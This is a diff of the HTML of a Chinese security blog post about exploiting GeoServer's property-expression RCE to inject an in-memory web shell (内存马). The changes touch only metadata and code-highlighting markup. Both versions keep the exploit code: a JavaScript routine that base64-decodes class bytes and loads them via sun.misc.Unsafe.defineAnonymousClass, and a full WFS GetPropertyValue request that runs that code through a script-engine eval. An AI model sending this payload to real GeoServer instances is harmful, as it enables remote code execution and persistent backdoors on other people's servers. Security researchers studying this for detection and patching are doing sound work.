@@ -10,13 +10,12 @@
     <title>GeoServer property RCE注入内存马 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="GeoServer property RCE注入内存马" />
 <meta property="og:description" content="1 背景GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。 在GeoServ" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/geoserver-memoryshell/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/geoserver-memoryshell/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-07-04T20:54:33+08:00" />
 <meta property="article:modified_time" content="2024-07-04T20:54:33+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="GeoServer property RCE注入内存马"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="GeoServer property RCE注入内存马"/>
 <meta name="twitter:description" content="1 背景GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。 在GeoServ"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -230,24 +229,24 @@ Y4tacker也在之前的文章中提到了怎么构造Js引擎的Poc：<a href="h
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function Base64DecodeToByte(str) {
-</span></span><span class="line"><span class="cl">    var bt;
-</span></span><span class="line"><span class="cl">    try {
-</span></span><span class="line"><span class="cl">        bt = java.lang.Class.forName(&#34;sun.misc.BASE64Decoder&#34;).newInstance().decodeBuffer(str);
-</span></span><span class="line"><span class="cl">    } catch (e) {
-</span></span><span class="line"><span class="cl">        bt = java.util.Base64.getDecoder().decode(str);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    return bt;
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">function</span> <span class="n">Base64DecodeToByte</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="n">bt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bt</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">newInstance</span><span class="p">()</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bt</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Base64</span><span class="o">.</span><span class="n">getDecoder</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">function defineClass(classBytes) {
-</span></span><span class="line"><span class="cl">    var theUnsafe = java.lang.Class.forName(&#34;sun.misc.Unsafe&#34;).getDeclaredField(&#34;theUnsafe&#34;);
-</span></span><span class="line"><span class="cl">    theUnsafe.setAccessible(true);
-</span></span><span class="line"><span class="cl">    unsafe = theUnsafe.get(null);
-</span></span><span class="line"><span class="cl">    unsafe.defineAnonymousClass(java.lang.Class.forName(&#34;java.lang.Class&#34;), classBytes, null).newInstance();
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">defineClass</span><span class="p">(</span><span class="n">classBytes</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="n">theUnsafe</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.Unsafe&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;theUnsafe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">theUnsafe</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsafe</span> <span class="o">=</span> <span class="n">theUnsafe</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsafe</span><span class="o">.</span><span class="n">defineAnonymousClass</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;java.lang.Class&#34;</span><span class="p">),</span> <span class="n">classBytes</span><span class="p">,</span> <span class="n">null</span><span class="p">)</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">defineClass(Base64DecodeToByte(code));
+</span></span><span class="line"><span class="cl"><span class="n">defineClass</span><span class="p">(</span><span class="n">Base64DecodeToByte</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>打这个漏洞如果返回java.lang.ClassCastException是正常的，但是出现了下面的报错，说明有问题了。
@@ -360,25 +359,25 @@ Y4tacker也在之前的文章中提到了怎么构造Js引擎的Poc：<a href="h
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39;
-</span></span><span class="line"><span class="cl"> xmlns:topp=&#39;http://www.openplans.org/topp&#39;
-</span></span><span class="line"><span class="cl"> xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39;
-</span></span><span class="line"><span class="cl"> xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;&gt;
-</span></span><span class="line"><span class="cl">  &lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
-</span></span><span class="line"><span class="cl">  &lt;wfs:valueReference&gt;eval(getEngineByName(javax.script.ScriptEngineManager.new(),&#39;js&#39;),&#39;
-</span></span><span class="line"><span class="cl">var str=&#34;&#34;;
-</span></span><span class="line"><span class="cl">var bt;
-</span></span><span class="line"><span class="cl">try {
-</span></span><span class="line"><span class="cl">    bt = java.lang.Class.forName(&#34;sun.misc.BASE64Decoder&#34;).newInstance().decodeBuffer(str);
-</span></span><span class="line"><span class="cl">} catch (e) {
-</span></span><span class="line"><span class="cl">    bt = java.util.Base64.getDecoder().decode(str);
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">var theUnsafe = java.lang.Class.forName(&#34;sun.misc.Unsafe&#34;).getDeclaredField(&#34;theUnsafe&#34;);
-</span></span><span class="line"><span class="cl">theUnsafe.setAccessible(true);
-</span></span><span class="line"><span class="cl">unsafe = theUnsafe.get(null);
-</span></span><span class="line"><span class="cl">unsafe.defineAnonymousClass(java.lang.Class.forName(&#34;java.lang.Class&#34;), bt, null).newInstance();
-</span></span><span class="line"><span class="cl">&#39;)&lt;/wfs:valueReference&gt;
-</span></span><span class="line"><span class="cl">&lt;/wfs:GetPropertyValue&gt;
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">wfs</span><span class="p">:</span><span class="n">GetPropertyValue</span> <span class="n">service</span><span class="o">=</span><span class="s1">&#39;WFS&#39;</span> <span class="n">version</span><span class="o">=</span><span class="s1">&#39;2.0.0&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">xmlns</span><span class="p">:</span><span class="n">topp</span><span class="o">=</span><span class="s1">&#39;http://www.openplans.org/topp&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">xmlns</span><span class="p">:</span><span class="n">fes</span><span class="o">=</span><span class="s1">&#39;http://www.opengis.net/fes/2.0&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">xmlns</span><span class="p">:</span><span class="n">wfs</span><span class="o">=</span><span class="s1">&#39;http://www.opengis.net/wfs/2.0&#39;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">wfs</span><span class="p">:</span><span class="n">Query</span> <span class="n">typeNames</span><span class="o">=</span><span class="s1">&#39;sf:archsites&#39;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">wfs</span><span class="p">:</span><span class="n">valueReference</span><span class="o">&gt;</span><span class="n">eval</span><span class="p">(</span><span class="n">getEngineByName</span><span class="p">(</span><span class="n">javax</span><span class="o">.</span><span class="n">script</span><span class="o">.</span><span class="n">ScriptEngineManager</span><span class="o">.</span><span class="n">new</span><span class="p">(),</span><span class="s1">&#39;js&#39;</span><span class="p">),</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="nb">str</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">bt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bt</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">newInstance</span><span class="p">()</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bt</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Base64</span><span class="o">.</span><span class="n">getDecoder</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">var</span> <span class="n">theUnsafe</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.Unsafe&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&#34;theUnsafe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">theUnsafe</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="bp">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">unsafe</span> <span class="o">=</span> <span class="n">theUnsafe</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">unsafe</span><span class="o">.</span><span class="n">defineAnonymousClass</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;java.lang.Class&#34;</span><span class="p">),</span> <span class="n">bt</span><span class="p">,</span> <span class="n">null</span><span class="p">)</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;)&lt;/wfs:valueReference&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">wfs</span><span class="p">:</span><span class="n">GetPropertyValue</span><span class="o">&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div></div>
